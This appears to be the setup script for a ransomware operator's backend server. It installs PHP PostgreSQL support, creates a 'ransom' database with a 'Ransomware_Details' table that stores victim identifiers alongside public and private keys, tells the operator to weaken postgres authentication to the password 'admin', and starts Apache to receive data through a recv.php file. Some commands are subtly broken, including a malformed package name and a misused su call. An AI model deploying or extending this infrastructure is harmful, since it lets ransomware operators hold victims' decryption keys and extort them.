#!/bin/bash
echo "[+]Installing important stuff"
apt-get install php7.4.-pgsql


echo "[+]Setting up psql server"
su - postgres && psql -c "CREATE DATABASE ransom;"
su - postgres && psql -c "\c ransom; create TABLE Ransomware_Details(\
	identifier VARCHAR(20) UNIQUE NOT NULL,\
	public_key VARCHAR(600) UNIQUE NOT NULL,\
	private_key VARCHAR(3000) UNIQUE NOT NULL\
	);"
echo "[!]Change the config file pg_hba.conf and set auth method to md5 for postgres user\nChange the password of postgres to admin (Not Recommended) or change the postgress password in recv.php file"

echo "[+]Starting apache server"
service apache2 start
